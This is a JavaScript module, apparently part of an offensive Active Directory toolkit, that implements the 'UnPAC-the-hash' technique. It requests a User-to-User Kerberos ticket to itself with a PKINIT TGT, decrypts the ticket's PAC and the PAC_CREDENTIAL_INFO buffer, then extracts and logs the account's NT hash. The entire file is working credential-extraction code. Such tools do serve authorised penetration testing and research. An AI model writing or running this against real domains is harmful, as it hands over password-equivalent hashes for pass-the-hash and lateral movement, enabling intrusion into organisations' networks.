// UnPAC-the-hash: recover an account's NT hash from a PKINIT TGT. We ask the KDC
// for a User-to-User ticket to ourselves (ENC-TKT-IN-SKEY), so the issued ticket
// is encrypted with our TGT session key and its PAC is readable. The PAC's
// PAC_CREDENTIAL_INFO is decrypted with the PKINIT reply key, yielding the
// NTLM_SUPPLEMENTAL_CREDENTIAL that carries the NT hash.

import { readTLV } from '../ldap/ber.js';
import { MSG_TYPE, NAME_TYPE, PADATA, KEY_USAGE, KDC_OPTIONS, ETYPE_PREFERENCE } from './constants.js';
import { authenticator, apReq, encryptedData, kdcReqBody, kdcReq, paData, parseKdcRep, parseKrbError } from './asn1.js';
import { encrypt, decrypt } from './crypto.js';
import { NdrReader } from '../smb/ndr.js';

const FAR_FUTURE = new Date(Date.UTC(2037, 8, 13, 2, 48, 5));
const randomNonce = () => { const b = globalThis.crypto.getRandomValues(new Uint8Array(4)); return ((b[0] << 24 | b[1] << 16 | b[2] << 8 | b[3]) >>> 0) & 0x7fffffff; };
const KEY_USAGE_TICKET = 2;         // EncTicketPart
const KEY_USAGE_PAC_CRED = 16;      // PAC_CREDENTIAL_INFO SerializedData
const readIntBE = (buf, t) => { let n = 0; for (let i = t.valueStart; i < t.valueEnd; i++) n = n * 256 + buf[i]; return n; };
const hex = (b) => Array.from(b, (x) => x.toString(16).padStart(2, '0')).join('');

// User-to-User TGS-REQ to self -> the raw issued ticket.
async function tgsU2U(transport, tgt) {
  const now = new Date(Date.now() + (tgt.clockOffsetMs || 0));
  const auth = authenticator({ crealm: tgt.crealm, cname: tgt.cname, ctime: now, cusec: 0 });
  const sk = tgt.sessionKey;
  const encAuth = encryptedData(sk.etype, encrypt(sk.etype, sk.key, KEY_USAGE.TGS_REQ_AUTH, auth));
  const ap = apReq({ apOptions: 0, ticket: tgt.ticket, encAuthenticator: encAuth });
  const body = kdcReqBody({
    kdcOptions: KDC_OPTIONS.FORWARDABLE | KDC_OPTIONS.RENEWABLE | KDC_OPTIONS.CANONICALIZE | KDC_OPTIONS.ENC_TKT_IN_SKEY,
    cname: null, realm: tgt.realm, sname: tgt.cname, snameType: NAME_TYPE.PRINCIPAL,
    till: FAR_FUTURE, nonce: randomNonce(), etypes: ETYPE_PREFERENCE, additionalTickets: [tgt.ticket],
  });
  const reply = await transport.request(kdcReq(MSG_TYPE.TGS_REQ, body, [paData(PADATA.TGS_REQ, ap)]));
  if (reply[0] === 0x7e) throw new Error(`U2U TGS-REQ failed: Kerberos error ${parseKrbError(reply).errorCode}`);
  return parseKdcRep(reply).ticket;
}

// EncryptedData enc-part of a Ticket ([APPLICATION 1] … enc-part [3]).
function ticketEncPart(ticket) {
  const seq = readTLV(ticket, readTLV(ticket, 0).valueStart);
  for (let p = seq.valueStart; p < seq.valueEnd;) {
    const t = readTLV(ticket, p);
    if (t.tag === 0xa3) { const ed = readTLV(ticket, t.valueStart); const m = {}; for (let r = ed.valueStart; r < ed.valueEnd;) { const e = readTLV(ticket, r); m[e.tag] = e; r = e.next; } const c = readTLV(ticket, m[0xa2].valueStart); return { etype: readIntBE(ticket, readTLV(ticket, m[0xa0].valueStart)), cipher: ticket.subarray(c.valueStart, c.valueEnd) }; }
    p = t.next;
  }
  throw new Error('ticket has no enc-part');
}

// Walk EncTicketPart authorization-data for the AD-WIN2K-PAC (recursing into AD-IF-RELEVANT).
function findPac(buf, start, end) {
  for (let p = start; p < end;) {
    const el = readTLV(buf, p); const m = {};
    for (let r = el.valueStart; r < el.valueEnd;) { const e = readTLV(buf, r); m[e.tag] = e; r = e.next; }
    const adType = readIntBE(buf, readTLV(buf, m[0xa0].valueStart));
    const oct = readTLV(buf, m[0xa1].valueStart);
    const adData = buf.subarray(oct.valueStart, oct.valueEnd);
    if (adType === 1) { const n = readTLV(adData, 0); const r = findPac(adData, n.valueStart, n.valueEnd); if (r) return r; }
    else if (adType === 128) return adData;
    p = el.next;
  }
  return null;
}
function extractPac(encTicketPart) {
  const seq = readTLV(encTicketPart, readTLV(encTicketPart, 0).valueStart);
  for (let p = seq.valueStart; p < seq.valueEnd;) {
    const t = readTLV(encTicketPart, p);
    if (t.tag === 0xaa) { const ad = readTLV(encTicketPart, t.valueStart); return findPac(encTicketPart, ad.valueStart, ad.valueEnd); }
    p = t.next;
  }
  return null;
}

// PACTYPE buffer of a given ulType.
function pacBuffer(pac, ulType) {
  const dv = new DataView(pac.buffer, pac.byteOffset, pac.byteLength);
  const cBuffers = dv.getUint32(0, true);
  for (let i = 0; i < cBuffers; i++) {
    const off = 8 + i * 16;
    if (dv.getUint32(off, true) === ulType) { const size = dv.getUint32(off + 4, true); const offset = Number(dv.getBigUint64(off + 8, true)); return pac.subarray(offset, offset + size); }
  }
  return null;
}

// PAC_CREDENTIAL_DATA (NDR type-serialization) -> [{ name, blob }].
function parseCredentialData(credData) {
  const r = new NdrReader(credData.subarray(16)); // skip the 8+8 type-serialization header
  r.u32();                                          // top-level unique pointer referent
  r.u32();                                          // hoisted conformant MaxCount
  const count = r.u32();                            // CredentialCount
  const creds = [];
  for (let i = 0; i < count; i++) { r.u16(); r.u16(); r.u32(); const cs = r.u32(); r.u32(); creds.push({ cs }); }
  for (const c of creds) {
    r.u32(); r.u32(); const actual = r.u32();       // PackageName buffer: MaxCount, Offset, ActualCount
    let name = ''; for (let i = 0; i < actual; i++) { const ch = r.u16(); if (ch) name += String.fromCharCode(ch); }
    r.align(4);
    r.u32();                                         // Credentials array MaxCount
    c.name = name; c.blob = Uint8Array.from(r.bytes(c.cs)); r.align(4);
  }
  return creds;
}

// tgt: a PKINIT TGT with { ticket, sessionKey, replyKey, … }. Returns the NT hash.
export async function unpacHash(transport, tgt, log = () => {}) {
  log('U2U TGS-REQ to self (ENC-TKT-IN-SKEY) …');
  const st = await tgsU2U(transport, tgt);
  const enc = ticketEncPart(st);
  const encTicketPart = decrypt(enc.etype, tgt.sessionKey.key, KEY_USAGE_TICKET, enc.cipher);
  const pac = extractPac(encTicketPart);
  if (!pac) throw new Error('no PAC in the U2U ticket');
  const credInfo = pacBuffer(pac, 2); // PAC_CREDENTIAL_INFO
  if (!credInfo) throw new Error('no PAC_CREDENTIAL_INFO (account has no stored NT hash, or non-PKINIT auth)');
  const dv = new DataView(credInfo.buffer, credInfo.byteOffset, credInfo.byteLength);
  const encType = dv.getUint32(4, true);
  const credData = decrypt(encType, tgt.replyKey.key, KEY_USAGE_PAC_CRED, credInfo.subarray(8));
  if (globalThis.__UNPAC_DEBUG) log(`PAC_CREDENTIAL_DATA (${credData.length}B): ${hex(credData)}`);
  const creds = parseCredentialData(credData);
  const ntlm = creds.find((c) => (c.name || '').toUpperCase() === 'NTLM') || creds[0];
  if (!ntlm || ntlm.blob.length < 40) throw new Error('no NTLM supplemental credential in the PAC');
  const nt = ntlm.blob.subarray(24, 40); // NTLM_SUPPLEMENTAL_CREDENTIAL: Version(4) Flags(4) Lm[16] Nt[16]
  const ntHash = hex(nt);
  log(`Recovered NT hash for ${tgt.username}: ${ntHash}`);
  return { username: tgt.username, realm: tgt.realm, ntHash };
}
